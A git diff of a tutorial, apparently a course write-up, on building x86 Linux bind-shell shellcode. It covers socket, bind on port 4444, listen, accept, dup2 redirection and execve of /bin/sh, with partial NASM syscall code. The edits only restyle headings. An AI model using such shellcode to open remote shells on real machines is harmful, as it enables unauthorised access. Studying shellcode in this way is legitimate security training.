@@ -134,7 +134,7 @@ After reviewing the `socket()` man pages, we discover we will need to fufill the
   - The protocol to be used with the socket. 
   - Normally there is only one protocol per socket type. In this case the protocol value is `0`.
 
-Our C socket function will be:  
+#### Our C function
 ```c
 int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);
 ```
@@ -160,7 +160,7 @@ struct in_addr {
 ```
 From the above information, we know that we will need to use the Address Family `AF_INET`, then give it a port number (we will use TCP port 4444), and finally we will bind it to any/all interfaces using `INADDR_ANY`.   
 
-The struct we will use is:  
+#### Our C struct
 ```c
 struct sockaddr_in ipSocketAddr = { 
   .sin_family = AF_INET, 
@@ -185,7 +185,7 @@ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
   - The final arguement is simply the byte length of our `ipSocketAddr` struct. 
   - We will fufill this using the C `sizeof()` function to do the work for us. 
 
-Our bind function will be:   
+#### Our C function   
 ```c
 bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
 ```
@@ -203,7 +203,7 @@ int listen(int sockfd, int backlog);
   - This is for handling multiple connections. 
   - We only need to handle one connection at a time, therefor we will set this value to `0`. 
 
-Our C function will be:   
+#### Our C function  
 ```c
 listen(ipv4Socket, 0);
 ```
@@ -219,7 +219,7 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 
 We will give our `accept()` function the variable name `clientSocket`. We will use our `ipv4Socket` variable we created earlier to fulfill the `int sockfd` arguments, and set the remaining two arguments to `NULL`.   
 
-Our C function will be:   
+#### Our C function
 ```c
 int clientSocket = accept(ipv4Socket, NULL, NULL);
 ```
@@ -231,7 +231,7 @@ We will duplicate the File Descriptors for Standard Input(0), Standard Output(1)
 int dup2(int oldfd, int newfd);
 ```
 We find that the `dup2()` function requires 2 arguements. The first arguement `int oldfd` we be fufilled using the `clientSocket` variable we created earlier. The second arguement `int newfd` will be fufilled using the number value for STDIN(0), STDOUT(1), and STDERR(2) respectively.  
-Our three dup2 functions will be:  
+#### Our three dup2 functions 
 ```c
 dup2(clientSocket, 0);
 dup2(clientSocket, 1);
@@ -246,7 +246,7 @@ Consulting the manual pages with `man 2 execve` we find:
 int execve(const char *filename, char *const argv[], char *const envp[]);
 ```
 We discover that since we are not passing any additional options/flags/enviorment-settings to our `/bin/sh` program, we may set the arguments `argv[]` and `envp[]` to `NULL`. The first arguement `*filename` requires we give it the full path to our program `/bin/sh`.  
-Our C function will be:  
+#### Our C function 
 ```c
 execve("/bin/sh", NULL, NULL);
 ```
@@ -285,11 +285,11 @@ Once we have pushed our array of consecutive arguments onto the stack, all we ne
 
 ## Creating the Assembly Shellcode
 ### 1. Create a new Socket
-C Function:   
+#### C Function
 ```c
 int socket(int domain, int type, int protocol);
 ```
-Our C Function:
+#### Our C Function
 ```c
 <socketcall>  int ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );
   EAX=0x66                      EBX     ECX[0]   ECX[1]    ECX[2]
@@ -341,11 +341,11 @@ xchg esi, eax     ; After the SYSCAL, sockfd is stored in the EAX Register.
 ```
 
 ### 2+3. Create a TCP-IP Address and Bind it to the Socket
-Default C Function:
+#### C Function
 ```c
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ```
-Our C Function:	 
+#### Our C Function 
 ```c   
 <socketcall>   bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
   EAX=0x66     EBX    ECX[0]                   ECX[1]                  ECX[2] 
@@ -417,11 +417,11 @@ int 0x80          ; System Call Interrupt 0x80
 ```
 
 ### 4. Listen for incoming connections on the TCP-IP Socket
-Default C Function:	
+#### C Function
 ```c
 int listen(int sockfd, int backlog);    
 ```
-Our C Function:	   
+#### Our C Function
 ```c
 <socketcall>   listen( ipv4Socket, 0 );
   EAX=0x66      EBX      ECX[0]   ECX[1]
@@ -503,9 +503,9 @@ EAX       EBX      ECX
 cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
   #define __NR_dup2  63
 ```   
-+ EBX = int oldfd = clientSocket
++ `EBX = int oldfd = clientSocket`
   - Already set with `xchg ebx, eax` after the execution of `accept()`.  
-+ ECX = 2 & 1 & 0 = 0x2 & 0x1 & 0x0
++ `ECX = 2 & 1 & 0 = 0x2 & 0x1 & 0x0`
   - Since we need to do this SYSCAL 3 times, we will use a loop.
 
 ```nasm  
